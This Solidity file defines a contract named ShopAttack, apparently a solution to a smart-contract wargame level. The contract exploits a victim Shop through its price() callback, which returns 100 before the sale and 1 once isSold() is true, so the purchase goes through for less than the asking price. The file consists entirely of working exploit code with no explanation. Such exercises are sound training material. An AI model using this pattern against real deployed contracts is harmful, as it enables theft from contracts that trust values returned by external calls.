// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Shop {
    function isSold() view external returns(bool);
    function buy() external;
}

contract ShopAttack {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 1 : 100;
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}
